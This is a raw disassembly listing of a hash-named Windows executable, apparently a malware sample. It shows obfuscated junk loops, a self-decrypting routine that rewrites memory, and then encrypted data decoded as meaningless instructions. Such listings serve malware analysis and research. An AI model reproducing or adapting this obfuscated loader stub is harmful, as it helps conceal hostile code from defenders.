
67e7e9041ae7d1dc5bc1be0bfc533d4e779b1d6bc4f2cd3f3343154e5ec82658.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    DWORD PTR ds:0x42b1de,0x13
  401013:	cmp    DWORD PTR ds:0x42b1de,0x0
  40101a:	je     0x401078
  401020:	cmp    DWORD PTR ds:0x42b1de,0x7
  401027:	jb     0x401078
  40102d:	jmp    0x401050
  401032:	push   0x42a019
  401037:	push   0x564d
  40103c:	push   DWORD PTR [ebp-0x28]
  40103f:	push   0x8804
  401044:	push   DWORD PTR [ebp-0x24]
  401047:	push   DWORD PTR [ebp-0x18]
  40104a:	call   DWORD PTR ds:0x42b2ea
  401050:	cmp    DWORD PTR ds:0x42b1de,0x8
  401057:	jne    0x401068
  40105d:	mov    eax,ds:0x42b1de
  401062:	dec    eax
  401063:	mov    ds:0x42b1de,eax
  401068:	mov    eax,ds:0x42b1de
  40106d:	dec    eax
  40106e:	mov    ds:0x42b1de,eax
  401073:	jmp    0x401013
  401078:	mov    eax,DWORD PTR [ebp+0x8]
  40107b:	mov    ecx,DWORD PTR ds:0x42b1be
  401081:	add    DWORD PTR ds:0x42b22a,ecx
  401087:	push   ebx
  401088:	and    DWORD PTR ds:0x42b21e,0x0
  401092:	xor    ecx,ecx
  401094:	or     ecx,DWORD PTR ds:0x42b21e
  40109a:	inc    ecx
  40109b:	mov    DWORD PTR ds:0x42b21e,ecx
  4010a1:	cmp    DWORD PTR ds:0x42b21e,0xc
  4010a8:	ja     0x4010ef
  4010ae:	jmp    0x4010c8
  4010b3:	push   0x42a03d
  4010b8:	push   0x0
  4010ba:	push   DWORD PTR [ebp-0xc]
  4010bd:	push   0x87c3
  4010c2:	call   DWORD PTR ds:0x42b2ee
  4010c8:	cmp    DWORD PTR ds:0x42b21e,0xb
  4010cf:	jne    0x4010e2
  4010d5:	mov    ecx,DWORD PTR ds:0x42b21e
  4010db:	inc    ecx
  4010dc:	mov    DWORD PTR ds:0x42b21e,ecx
  4010e2:	cmp    DWORD PTR ds:0x42b21e,0x1b
  4010e9:	jb     0x401092
  4010ef:	push   esi
  4010f0:	push   edi
  4010f1:	mov    esi,0x75108ae
  4010f6:	mov    DWORD PTR ds:0x42b1f6,0x15
  401100:	cmp    DWORD PTR ds:0x42b1f6,0x0
  401107:	je     0x401156
  40110d:	cmp    DWORD PTR ds:0x42b1f6,0x9
  401114:	jb     0x401156
  40111a:	jmp    0x40112a
  40111f:	push   0x7250
  401124:	call   DWORD PTR ds:0x42b2f2
  40112a:	cmp    DWORD PTR ds:0x42b1f6,0xa
  401131:	jne    0x401144
  401137:	mov    ecx,DWORD PTR ds:0x42b1f6
  40113d:	dec    ecx
  40113e:	mov    DWORD PTR ds:0x42b1f6,ecx
  401144:	mov    ecx,DWORD PTR ds:0x42b1f6
  40114a:	dec    ecx
  40114b:	mov    DWORD PTR ds:0x42b1f6,ecx
  401151:	jmp    0x401100
  401156:	xor    eax,esi
  401158:	mov    edi,0x3272f5
  40115d:	dec    DWORD PTR ds:0x42b19e
  401163:	add    eax,edi
  401165:	add    DWORD PTR ds:0x42b186,edi
  40116b:	mov    DWORD PTR [ebp-0x40],eax
  40116e:	mov    eax,ds:0x42a2f2
  401173:	xor    DWORD PTR ds:0x42b1aa,0x2d22
  40117d:	mov    eax,DWORD PTR [eax]
  40117f:	mov    ecx,DWORD PTR ds:0x42b22e
  401185:	sbb    ecx,DWORD PTR ds:0x42b1fe
  40118b:	mov    DWORD PTR ds:0x42b22e,ecx
  401191:	mov    DWORD PTR [ebp-0x3c],eax
  401194:	and    DWORD PTR ds:0x42b192,0x0
  40119e:	jmp    0x4011b0
  4011a3:	mov    ecx,DWORD PTR ds:0x42b192
  4011a9:	inc    ecx
  4011aa:	mov    DWORD PTR ds:0x42b192,ecx
  4011b0:	cmp    DWORD PTR ds:0x42b192,0x15
  4011b7:	jae    0x4011f9
  4011bd:	cmp    DWORD PTR ds:0x42b192,0x8
  4011c4:	jg     0x4011f9
  4011ca:	jmp    0x4011da
  4011cf:	push   0x42b1aa
  4011d4:	call   DWORD PTR ds:0x42b2f6
  4011da:	cmp    DWORD PTR ds:0x42b192,0x7
  4011e1:	jne    0x4011f4
  4011e7:	mov    ecx,DWORD PTR ds:0x42b192
  4011ed:	inc    ecx
  4011ee:	mov    DWORD PTR ds:0x42b192,ecx
  4011f4:	jmp    0x4011a3
  4011f9:	mov    eax,ds:0x42a502
  4011fe:	xor    DWORD PTR ds:0x42b182,0x12c5
  401208:	mov    eax,DWORD PTR [eax]
  40120a:	mov    DWORD PTR [ebp-0x1c],eax
  40120d:	mov    DWORD PTR ds:0x42b1da,0x1a
  401217:	cmp    DWORD PTR ds:0x42b1da,0x0
  40121e:	je     0x40127b
  401224:	cmp    DWORD PTR ds:0x42b1da,0x8
  40122b:	jl     0x40127b
  401231:	jmp    0x401250
  401236:	push   0x42b1ba
  40123b:	push   0x42b1d2
  401240:	push   0x8af3
  401245:	push   0x42a12c
  40124a:	call   DWORD PTR ds:0x42b2fa
  401250:	cmp    DWORD PTR ds:0x42b1da,0x9
  401257:	jne    0x40126b
  40125d:	xor    eax,eax
  40125f:	or     eax,DWORD PTR ds:0x42b1da
  401265:	dec    eax
  401266:	mov    ds:0x42b1da,eax
  40126b:	mov    eax,ds:0x42b1da
  401270:	dec    eax
  401271:	mov    ds:0x42b1da,eax
  401276:	jmp    0x401217
  40127b:	mov    DWORD PTR [ebp-0x34],0xf89c87a5
  401282:	mov    eax,DWORD PTR [ebp-0x34]
  401285:	xor    eax,esi
  401287:	xor    DWORD PTR ds:0x42b222,edi
  40128d:	add    eax,edi
  40128f:	or     ecx,DWORD PTR ds:0x42b222
  401295:	mov    DWORD PTR [ebp-0x40],eax
  401298:	adc    ecx,DWORD PTR ds:0x42b19a
  40129e:	mov    eax,ds:0x42a472
  4012a3:	xor    DWORD PTR ds:0x42b1d6,0x6afc
  4012ad:	mov    DWORD PTR [ebp-0x40],eax
  4012b0:	mov    eax,DWORD PTR [ebp-0x3c]
  4012b3:	mov    DWORD PTR [ebp-0x14],eax
  4012b6:	adc    eax,0x46d9
  4012bb:	mov    eax,DWORD PTR [ebp-0x14]
  4012be:	and    DWORD PTR ds:0x42b222,0x0
  4012c8:	jmp    0x4012da
  4012cd:	mov    ecx,DWORD PTR ds:0x42b222
  4012d3:	inc    ecx
  4012d4:	mov    DWORD PTR ds:0x42b222,ecx
  4012da:	cmp    DWORD PTR ds:0x42b222,0x1c
  4012e1:	jae    0x401328
  4012e7:	cmp    DWORD PTR ds:0x42b222,0x5
  4012ee:	jg     0x401328
  4012f4:	jmp    0x401309
  4012f9:	push   0x42b1e2
  4012fe:	push   0x42a2a1
  401303:	call   DWORD PTR ds:0x42b2fe
  401309:	cmp    DWORD PTR ds:0x42b222,0x4
  401310:	jne    0x401323
  401316:	mov    ecx,DWORD PTR ds:0x42b222
  40131c:	inc    ecx
  40131d:	mov    DWORD PTR ds:0x42b222,ecx
  401323:	jmp    0x4012cd
  401328:	push   0x4
  40132a:	or     DWORD PTR ds:0x42b186,0x3485
  401334:	pop    ecx
  401335:	and    DWORD PTR ds:0x42b206,0x42b1ee
  40133f:	sub    ecx,eax
  401341:	dec    eax
  401342:	add    ecx,DWORD PTR [ebp-0x1c]
  401345:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  40134c:	adc    DWORD PTR ds:0x42b20e,0x42b1e2
  401356:	mov    DWORD PTR [ebp-0x18],ecx
  401359:	mov    DWORD PTR [ebp-0xa0],0xf89c85a1
  401363:	or     DWORD PTR ds:0x42b182,0x6f89
  40136d:	mov    eax,DWORD PTR [ebp-0x14]
  401370:	xor    DWORD PTR ds:0x42b20e,0x6cd3
  40137a:	mov    DWORD PTR [ebp-0x9c],eax
  401380:	adc    eax,DWORD PTR ds:0x42b196
  401386:	mov    eax,DWORD PTR [ebp-0x18]
  401389:	and    DWORD PTR ds:0x42b22a,0x42b226
  401393:	mov    DWORD PTR [ebp-0x98],eax
  401399:	xor    DWORD PTR ds:0x42b186,ecx
  40139f:	mov    eax,DWORD PTR [ebp-0x2c]
  4013a2:	adc    DWORD PTR ds:0x42b1f6,0x42b22a
  4013ac:	xor    eax,esi
  4013ae:	add    eax,edi
  4013b0:	add    DWORD PTR ds:0x42b22e,0x47bc
  4013ba:	mov    DWORD PTR [ebp-0x94],eax
  4013c0:	and    DWORD PTR ds:0x42b20e,0x42b202
  4013ca:	lea    eax,[ebp-0x48]
  4013cd:	mov    DWORD PTR [ebp-0x90],eax
  4013d3:	add    eax,0x2eac
  4013d8:	mov    eax,DWORD PTR [ebp-0xa0]
  4013de:	xor    eax,esi
  4013e0:	sub    DWORD PTR ds:0x42b20e,0x42b1f6
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0xa0],eax
  4013f2:	inc    DWORD PTR ds:0x42b1ce
  4013f8:	lea    eax,[ebp-0xa0]
  4013fe:	add    DWORD PTR ds:0x42b1a6,0x42b21a
  401408:	push   eax
  401409:	sub    DWORD PTR ds:0x42b1fe,ebx
  40140f:	mov    eax,DWORD PTR [ebp+0xc]
  401412:	and    DWORD PTR ds:0x42b226,0xfdc
  40141c:	xor    eax,esi
  40141e:	add    eax,edi
  401420:	push   eax
  401421:	and    DWORD PTR ds:0x42b192,ecx
  401427:	mov    eax,ds:0x42a492
  40142c:	sub    DWORD PTR ds:0x42b1f6,0x42b1c6
  401436:	push   0x42a3e8
  40143b:	and    DWORD PTR ds:0x42b1c2,0x42b19e
  401445:	push   DWORD PTR [eax]
  401447:	call   0x4061fa
  40144c:	mov    ebx,DWORD PTR ds:0x42b226
  401452:	add    ebx,DWORD PTR ds:0x42b19a
  401458:	mov    DWORD PTR ds:0x42b226,ebx
  40145e:	mov    ebx,DWORD PTR [ebp-0x14]
  401461:	adc    edx,DWORD PTR ds:0x42b1da
  401467:	mov    eax,DWORD PTR [ebp-0x18]
  40146a:	and    DWORD PTR ds:0x42b1f2,0x0
  401474:	mov    edx,DWORD PTR ds:0x42b1f2
  40147a:	inc    edx
  40147b:	mov    DWORD PTR ds:0x42b1f2,edx
  401481:	cmp    DWORD PTR ds:0x42b1f2,0x8
  401488:	ja     0x4014d0
  40148e:	jmp    0x4014a9
  401493:	push   DWORD PTR [ebp-0x10]
  401496:	push   DWORD PTR [ebp-0x28]
  401499:	push   0x42a223
  40149e:	push   0x400000
  4014a3:	call   DWORD PTR ds:0x42b306
  4014a9:	cmp    DWORD PTR ds:0x42b1f2,0x7
  4014b0:	jne    0x4014c3
  4014b6:	mov    edx,DWORD PTR ds:0x42b1f2
  4014bc:	inc    edx
  4014bd:	mov    DWORD PTR ds:0x42b1f2,edx
  4014c3:	cmp    DWORD PTR ds:0x42b1f2,0x1e
  4014ca:	jb     0x401474
  4014d0:	mov    DWORD PTR [ebp-0x58],eax
  4014d3:	or     DWORD PTR ds:0x42b1ce,edi
  4014d9:	mov    DWORD PTR [ebp-0x34],0xf89c853d
  4014e0:	sub    DWORD PTR ds:0x42b1f2,0x209f
  4014ea:	mov    eax,0xf89c85a3
  4014ef:	sbb    DWORD PTR ds:0x42b21a,0x6d23
  4014f9:	mov    DWORD PTR [ebp-0x1c],eax
  4014fc:	sub    DWORD PTR ds:0x42b206,ebx
  401502:	lea    ecx,[eax+0x2]
  401505:	adc    edx,0x42c6
  40150b:	mov    DWORD PTR [ebp-0x28],ecx
  40150e:	inc    edx
  40150f:	mov    DWORD PTR [ebp-0x10],0xf89c85a2
  401516:	or     edx,DWORD PTR ds:0x42b182
  40151c:	mov    DWORD PTR [ebp-0x8],eax
  40151f:	mov    edx,DWORD PTR ds:0x42b256
  401525:	xor    eax,eax
  401527:	xor    eax,DWORD PTR ds:0x42b276
  40152d:	sub    edx,eax
  40152f:	sub    edx,DWORD PTR [edx+eax*1]
  401532:	mov    eax,DWORD PTR [ebp-0x10]
  401535:	xor    DWORD PTR ds:0x42b1b2,edi
  40153b:	xor    eax,esi
  40153d:	sub    DWORD PTR ds:0x42b1be,ecx
  401543:	mov    edx,0xffcd8d8b
  401548:	sbb    DWORD PTR ds:0x42b182,0x343
  401552:	sub    edx,eax
  401554:	mov    DWORD PTR [ebp-0xc],edx
  401557:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  40155e:	mov    eax,DWORD PTR [ebp-0x8]
  401561:	mov    DWORD PTR ds:0x42b216,0x6ef4
  40156b:	mov    DWORD PTR [ebp-0x3c],ebx
  40156e:	mov    DWORD PTR ds:0x42b206,0x4694
  401578:	cmp    eax,ecx
  40157a:	mov    DWORD PTR ds:0x42b21e,0x4f34
  401584:	je     0x401870
  40158a:	or     eax,DWORD PTR ds:0x42b22e
  401590:	mov    eax,DWORD PTR [ebp-0x10]
  401593:	and    DWORD PTR ds:0x42b21a,0x0
  40159d:	jmp    0x4015af
  4015a2:	mov    ecx,DWORD PTR ds:0x42b21a
  4015a8:	inc    ecx
  4015a9:	mov    DWORD PTR ds:0x42b21a,ecx
  4015af:	cmp    DWORD PTR ds:0x42b21a,0x1b
  4015b6:	jae    0x4015e4
  4015bc:	cmp    DWORD PTR ds:0x42b21a,0x1c
  4015c3:	jb     0x4015e4
  4015c9:	jmp    0x4015df
  4015ce:	push   0x42a211
  4015d3:	push   DWORD PTR [ebp-0x1c]
  4015d6:	push   DWORD PTR [ebp-0x14]
  4015d9:	call   DWORD PTR ds:0x42b30e
  4015df:	jmp    0x4015a2
  4015e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4015e7:	adc    DWORD PTR ds:0x42b196,0x5f31
  4015f1:	xor    eax,esi
  4015f3:	xor    ecx,esi
  4015f5:	or     DWORD PTR ds:0x42b1d6,0x22e1
  4015ff:	lea    ecx,[eax+ecx*1+0x64e5ea]
  401606:	mov    eax,ds:0x42b186
  40160b:	xor    DWORD PTR ds:0x42b1ee,eax
  401611:	mov    eax,DWORD PTR [ebp-0xc]
  401614:	xor    edx,edx
  401616:	xor    DWORD PTR ds:0x42b212,0x42b202
  401620:	div    ecx
  401622:	mov    eax,DWORD PTR [ebp-0x8]
  401625:	sub    DWORD PTR ds:0x42b192,edi
  40162b:	mov    ecx,DWORD PTR [ebp-0x10]
  40162e:	xor    eax,esi
  401630:	add    DWORD PTR ds:0x42b1c6,0x2cb7
  40163a:	xor    ecx,esi
  40163c:	sub    eax,ecx
  40163e:	mov    DWORD PTR ds:0x42b21a,0x2b73
  401648:	cmp    edx,eax
  40164a:	mov    DWORD PTR ds:0x42b21e,0x4704
  401654:	jne    0x40181a
  40165a:	mov    eax,DWORD PTR [ebp-0xc]
  40165d:	xor    ecx,0x1cf0
  401663:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  40166a:	mov    eax,DWORD PTR [ebp-0x28]
  40166d:	add    DWORD PTR ds:0x42b1ce,0x4d15
  401677:	mov    ecx,DWORD PTR [ebp-0x18]
  40167a:	or     DWORD PTR ds:0x42b18e,0x42b1ea
  401684:	xor    eax,esi
  401686:	add    DWORD PTR ds:0x42b18e,0x42b182
  401690:	xor    ecx,esi
  401692:	or     DWORD PTR ds:0x42b21a,0x42b1aa
  40169c:	add    eax,edi
  40169e:	adc    DWORD PTR ds:0x42b1e2,0x3afa
  4016a8:	add    ecx,edi
  4016aa:	mov    BYTE PTR [ebp-0x21],dl
  4016ad:	cmp    eax,ecx
  4016af:	jae    0x4017e8
  4016b5:	and    DWORD PTR ds:0x42b1fe,0x0
  4016bf:	mov    edx,DWORD PTR ds:0x42b1fe
  4016c5:	inc    edx
  4016c6:	mov    DWORD PTR ds:0x42b1fe,edx
  4016cc:	cmp    DWORD PTR ds:0x42b1fe,0x27
  4016d3:	ja     0x4016f6
  4016d9:	jmp    0x4016e9
  4016de:	push   0x18bf
  4016e3:	call   DWORD PTR ds:0x42b316
  4016e9:	cmp    DWORD PTR ds:0x42b1fe,0x18
  4016f0:	jb     0x4016bf
  4016f6:	lea    ecx,[eax-0x3272f5]
  4016fc:	adc    DWORD PTR ds:0x42b19e,0x3c59
  401706:	mov    DWORD PTR [ebp-0x14],ecx
  401709:	mov    edx,DWORD PTR [ebp-0x14]
  40170c:	xor    edx,esi
  40170e:	add    DWORD PTR ds:0x42b192,0x42b1fa
  401718:	add    edx,0x7f55d8e3
  40171e:	lea    ecx,[ebp+eax*4-0xb4]
  401725:	mov    DWORD PTR ds:0x42b1ca,0x6fb0
  40172f:	mov    DWORD PTR [ecx],edx
  401731:	mov    edx,DWORD PTR [ecx]
  401733:	cmp    edx,0x244ecb80
  401739:	mov    DWORD PTR ds:0x42b1e2,0xbe5
  401743:	jbe    0x40175e
  401749:	add    DWORD PTR [ecx],0x405fcc1
  40174f:	mov    DWORD PTR ds:0x42b1ca,0x62ff
  401759:	jmp    0x401764
  40175e:	add    DWORD PTR [ecx],0xfdaf433f
  401764:	sbb    DWORD PTR ds:0x42b1c2,0x1be5
  40176e:	mov    ecx,DWORD PTR [ebp-0x18]
  401771:	xor    DWORD PTR ds:0x42b1c6,0x42b18e
  40177b:	xor    ecx,esi
  40177d:	xor    DWORD PTR ds:0x42b1f6,0x42b192
  401787:	inc    eax
  401788:	inc    DWORD PTR [ebp-0x14]
  40178b:	adc    DWORD PTR ds:0x42b1b2,0x7e0f
  401795:	add    ecx,edi
  401797:	cmp    eax,ecx
  401799:	jb     0x401709
  40179f:	mov    DWORD PTR ds:0x42b192,0x13
  4017a9:	cmp    DWORD PTR ds:0x42b192,0x0
  4017b0:	je     0x4017e5
  4017b6:	cmp    DWORD PTR ds:0x42b192,0x20
  4017bd:	jl     0x4017e5
  4017c3:	jmp    0x4017d5
  4017c8:	push   0xd
  4017ca:	push   0x57ae
  4017cf:	call   DWORD PTR ds:0x42b31a
  4017d5:	mov    eax,ds:0x42b192
  4017da:	dec    eax
  4017db:	mov    ds:0x42b192,eax
  4017e0:	jmp    0x4017a9
  4017e5:	mov    dl,BYTE PTR [ebp-0x21]
  4017e8:	mov    eax,ds:0x42b226
  4017ed:	sub    eax,DWORD PTR ds:0x42b1ce
  4017f3:	mov    ds:0x42b226,eax
  4017f8:	mov    eax,DWORD PTR [ebp-0x34]
  4017fb:	xor    al,0xae
  4017fd:	mov    cl,0xb
  4017ff:	sub    cl,al
  401801:	add    dl,cl
  401803:	mov    ecx,DWORD PTR [ebp-0x1c]
  401806:	xor    cl,0xae
  401809:	sub    cl,0xb
  40180c:	ror    dl,cl
  40180e:	xor    eax,eax
  401810:	mov    eax,DWORD PTR [ebp-0xc]
  401813:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  40181a:	mov    eax,DWORD PTR [ebp-0xc]
  40181d:	mov    ecx,DWORD PTR [ebp-0x28]
  401820:	sub    eax,edi
  401822:	xor    eax,esi
  401824:	cmp    eax,ecx
  401826:	jne    0x401850
  40182c:	mov    eax,DWORD PTR [ebp-0x8]
  40182f:	mov    ecx,DWORD PTR [ebp-0x10]
  401832:	xor    eax,esi
  401834:	xor    ecx,esi
  401836:	sub    eax,ecx
  401838:	sub    eax,edi
  40183a:	xor    eax,esi
  40183c:	mov    DWORD PTR [ebp-0x8],eax
  40183f:	mov    eax,DWORD PTR [ebp-0x10]
  401842:	xor    eax,esi
  401844:	mov    ecx,0xffcd8d8b
  401849:	sub    ecx,eax
  40184b:	jmp    0x40185f
  401850:	mov    eax,DWORD PTR [ebp-0x10]
  401853:	xor    eax,esi
  401855:	mov    ecx,0xffcd8d0b
  40185a:	sub    ecx,eax
  40185c:	add    ecx,DWORD PTR [ebp-0xc]
  40185f:	mov    DWORD PTR [ebp-0xc],ecx
  401862:	mov    eax,DWORD PTR [ebp-0x8]
  401865:	cmp    eax,0xf89c85a5
  40186a:	jne    0x40158a
  401870:	mov    DWORD PTR [ebp-0x34],0x9
  401877:	mov    ecx,DWORD PTR [ebp+0x8]
  40187a:	xor    ecx,esi
  40187c:	add    ecx,edi
  40187e:	jmp    0x406188
  401883:	lea    eax,[ecx+ebx*1]
  401886:	mov    DWORD PTR [ebp-0x2c],eax
  401889:	mov    eax,DWORD PTR [ebp-0x58]
  40188c:	sub    eax,ecx
  40188e:	mov    DWORD PTR [ebp-0x1c],eax
  401891:	mov    eax,DWORD PTR [ebp-0x1c]
  401894:	mov    DWORD PTR [ebp-0x14],eax
  401897:	mov    eax,DWORD PTR [ebp-0x2c]
  40189a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4018a1:	mov    DWORD PTR [ebp-0x54],eax
  4018a4:	mov    DWORD PTR [ebp-0x20],0xf89c85a2
  4018ab:	mov    eax,DWORD PTR [ebp-0x38]
  4018ae:	xor    eax,esi
  4018b0:	add    eax,edi
  4018b2:	mov    DWORD PTR [ebp-0x10],eax
  4018b5:	mov    eax,DWORD PTR [ebp-0x38]
  4018b8:	xor    eax,esi
  4018ba:	add    eax,edi
  4018bc:	mov    DWORD PTR [ebp-0x8],eax
  4018bf:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4018c6:	jmp    0x403c1b
  4018cb:	mov    al,0x2a
  4018cd:	dec    ecx
  4018ce:	and    ebp,eax
  4018d0:	adc    ch,BYTE PTR [eax-0x7dd88776]
  4018d6:	push   esi
  4018d7:	enter  0xc132,0xfe
  4018db:	add    DWORD PTR [ebx+0x5e4b8383],0xffffff83
  4018e2:	sub    DWORD PTR [eax],0x31
  4018e5:	es cmp al,0x24
  4018e8:	cmp    BYTE PTR [edx],ah
  4018ea:	cs js  0x401928
  4018ed:	je     0x401966
  4018ef:	adc    DWORD PTR [ecx+0x70],esi
  4018f2:	jae    0x401964
  4018f4:	dec    ebx
  4018f5:	fsub   st,st(1)
  4018f7:	cld    
  4018f8:	ins    DWORD PTR es:[edi],dx
  4018f9:	push   ebp
  4018fa:	jb     0x401978
  4018fc:	bound  ebp,QWORD PTR [ebp-0x319b8f83]
  401902:	pusha  
  401903:	push   ebx
  401904:	cmp    eax,0x87960391
  401909:	push   ax
  40190b:	jle    0x401953
  40190d:	lea    esi,[edi+0x42bbbd7e]
  401913:	xor    esi,edi
  401915:	ja     0x4018f8
  401917:	add    ebp,DWORD PTR [edx+0x7e]
  40191a:	pop    ds
  40191b:	lock inc esp
  40191d:	rol    bl,1
  40191f:	lock xchg esi,eax
  401921:	sub    bl,bh
  401923:	xchg   edx,eax
  401924:	xor    al,0xe
  401926:	fs mov dl,0x93
  401929:	fld    DWORD PTR [esi]
  40192b:	jo     0x40190d
  40192d:	sbb    ecx,ebp
  40192f:	lsl    esi,WORD PTR [edi]
  401932:	and    eax,0x72371155
  401937:	jne    0x4018fd
  401939:	scas   al,BYTE PTR es:[edi]
  40193a:	sub    bl,BYTE PTR [eax+ebx*1-0x49]
  40193e:	(bad)  
  40193f:	hlt    
  401940:	push   esp
  401941:	xor    cl,BYTE PTR [ecx+0x462d54b]
  401947:	and    eax,DWORD PTR [ebx]
  401949:	test   DWORD PTR [edx+edi*2-0x6da15a20],edi
  401950:	mov    esp,0x4c9b2916
  401955:	or     bl,BYTE PTR [edi+0x128a8b41]
  40195b:	jecxz  0x40198d
  40195d:	imul   edx,DWORD PTR [eax-0x596b5b7],0xffffffce
  401964:	xchg   ebx,eax
  401965:	xor    al,0x94
  401967:	int    0xc6
  401969:	rcl    DWORD PTR [ebp+0x6b58f96c],1
  40196f:	push   ecx
  401970:	adc    DWORD PTR [edi],edi
  401972:	or     al,BYTE PTR [edi+0x1a]
  401975:	mov    al,0x52
  401977:	shl    DWORD PTR [esi+0x6719dd4d],cl
  40197d:	add    BYTE PTR [ebx+0x67],ch
  401980:	mov    eax,0x5be7504
  401985:	pop    ebx
  401986:	and    eax,0x5aa2566a
  40198b:	(bad)  
  40198d:	inc    esi
  40198e:	outs   dx,BYTE PTR ds:[esi]
  40198f:	ins    BYTE PTR es:[edi],dx
  401990:	scas   al,BYTE PTR es:[edi]
  401991:	mov    ds:0xcd887e29,al
  401996:	and    DWORD PTR [ebx-0x80],edi
  401999:	push   ecx
  40199a:	jb     0x401922
  40199c:	ins    BYTE PTR es:[edi],dx
  40199d:	jge    0x4019e0
  40199f:	pop    ss
  4019a0:	dec    ebp
  4019a1:	push   edx
  4019a2:	push   0xffffffad
  4019a4:	test   eax,0x7cf24908
  4019a9:	lahf   
  4019aa:	inc    ecx
  4019ab:	add    BYTE PTR gs:[esi+0x6213fe03],cl
  4019b2:	jne    0x4019f8
  4019b4:	push   esi
  4019b5:	or     BYTE PTR [ebp+0x22],0xaa
  4019b9:	xor    DWORD PTR [ebp+0x51d4854b],ecx
  4019bf:	clc    
  4019c0:	ds jecxz 0x401978
  4019c3:	fldenv ds:0x537f7e33
  4019c9:	ja     0x401a09
  4019cb:	pop    ebp
  4019cc:	inc    edi
  4019cd:	popa   
  4019ce:	js     0x4019ab
  4019d0:	jge    0x40197b
  4019d2:	out    0xf0,al
  4019d4:	mov    ah,bl
  4019d6:	bswap  ecx
  4019d8:	push   esp
  4019d9:	or     al,0xa1
  4019db:	fsubr  DWORD PTR [ebx]
  4019dd:	inc    esp
  4019df:	call   0x9ee2:0x6bbada58
  4019e6:	cmove  esp,DWORD PTR [ebx]
  4019e9:	mov    ch,0xd9
  4019eb:	pop    es
  4019ec:	mov    eax,0x399ddc12
  4019f1:	aad    0x68
  4019f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019f4:	cwde   
  4019f5:	es dec esi
  4019f7:	mov    ds:0x49e38df7,eax
  4019fc:	in     eax,0x3
  4019fe:	or     bl,BYTE PTR [ecx+0x72]
  401a01:	mov    dl,0x8c
  401a03:	fld    DWORD PTR [ecx]
  401a05:	mov    esi,0x2077b540
  401a0a:	jb     0x401a56
  401a0c:	add    DWORD PTR [edx-0x1c77e3b3],edx
  401a12:	popa   
  401a13:	into   
  401a14:	and    DWORD PTR [edx-0x52],esp
  401a17:	pushf  
  401a18:	mov    ds:0x46beaac6,al
  401a1d:	inc    ecx
  401a1e:	nop
  401a1f:	icebp  
  401a20:	retf   
  401a21:	xor    dh,dl
  401a23:	xchg   esi,ecx
  401a25:	hlt    
  401a26:	fwait
  401a27:	rcl    dh,1
  401a29:	add    cl,BYTE PTR [edi-0xc]
  401a2c:	adc    eax,0xffffffe4
  401a2f:	mov    esp,0x2fcc0e1
  401a34:	imul   BYTE PTR [esi-0x792309d]
  401a3a:	sbb    ebx,DWORD PTR gs:[eax+edx*1-0x547c403c]
  401a42:	loope  0x401a8a
  401a44:	pop    eax
  401a45:	out    dx,eax
  401a46:	mov    ds:0x13fb717e,eax
  401a4b:	fs das 
  401a4d:	push   0x16
  401a4f:	mov    bh,0x61
  401a51:	(bad)  
  401a52:	or     DWORD PTR [ebx+0x57],edx
  401a55:	(bad)  
  401a56:	sub    dl,cl
  401a58:	push   edx
  401a59:	mov    ds:0xe586dcd4,al
  401a5e:	mov    ebp,esp
  401a60:	mov    WORD PTR [edx+0x7f0a911d],?
  401a66:	jg     0x401a15
  401a68:	iret   
  401a69:	int3   
  401a6a:	(bad)  
  401a6b:	push   0x7f
  401a6d:	or     eax,0x5e011d48
  401a72:	inc    ebx
  401a73:	pop    edi
  401a74:	mov    DWORD PTR [ecx],esi
  401a76:	push   ds
  401a77:	push   0xb5a8d33d
  401a7c:	inc    esp
  401a7d:	sub    al,0x41
  401a7f:	scas   eax,DWORD PTR es:[edi]
  401a80:	fmul   QWORD PTR [edx-0x4b4055f8]
  401a86:	dec    ecx
  401a87:	dec    ecx
  401a88:	push   ecx
  401a89:	aad    0x28
  401a8b:	cmc    
  401a8c:	inc    ebp
  401a8d:	test   BYTE PTR [esi],al
  401a8f:	adc    dl,BYTE PTR [edi-0x79]
  401a92:	out    0xc5,eax
  401a94:	and    al,0xbb
  401a96:	sub    BYTE PTR [ebp+0x2733b3ff],0xf3
  401a9d:	mov    BYTE PTR [ebp-0x15872a00],ah
  401aa3:	or     BYTE PTR [edi-0x4e6b8d1b],dl
  401aa9:	jns    0x401aea
  401aab:	imul   edx,DWORD PTR [eax],0x55
  401aae:	cli    
  401aaf:	bound  eax,QWORD PTR [eax-0x5b]
  401ab2:	into   
  401ab3:	lods   eax,DWORD PTR ds:[esi]
  401ab4:	outs   dx,DWORD PTR ds:[esi]
  401ab5:	xchg   ecx,eax
  401ab6:	cli    
  401ab7:	inc    ebx
  401ab8:	mov    gs,WORD PTR [edi]
  401aba:	popf   
  401abb:	pushf  
  401abc:	jns    0x401b03
  401abe:	xlat   BYTE PTR ds:[ebx]
  401abf:	adc    eax,0x1106bbe8
  401ac4:	adc    ebp,0xc1f66e63
  401aca:	mov    dh,bl
  401acc:	fcom   DWORD PTR [esi+0x4d3769e7]
  401ad2:	jae    0x401a5f
  401ad4:	test   BYTE PTR [ebx],bh
  401ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ad7:	sub    ah,BYTE PTR ds:[ebp-0x5]
  401adb:	pop    ebp
  401adc:	xchg   ebx,eax
  401add:	inc    esp
  401ade:	cmp    BYTE PTR gs:[ebx-0x5f1bb83b],dl
  401ae5:	cmp    DWORD PTR [ecx+0xf79b4ae],ebx
  401aeb:	add    esp,0x16
  401aee:	aam    0xd
  401af0:	enter  0xa75b,0xca
  401af4:	loope  0x401a93
  401af6:	cli    
  401af7:	inc    ecx
  401af8:	adc    al,BYTE PTR [ebp+eax*8+0x47]
  401afc:	jl     0x401a86
  401afe:	mov    edx,0x848d0e37
  401b03:	xor    al,0x9f
  401b05:	and    al,BYTE PTR [edi]
  401b07:	gs inc esi
  401b09:	inc    edi
  401b0a:	ficom  DWORD PTR [edx+0x3e]
  401b0d:	pop    esi
  401b0e:	inc    ebp
  401b0f:	mov    bh,0x35
  401b11:	je     0x401a9b
  401b13:	xchg   ecx,eax
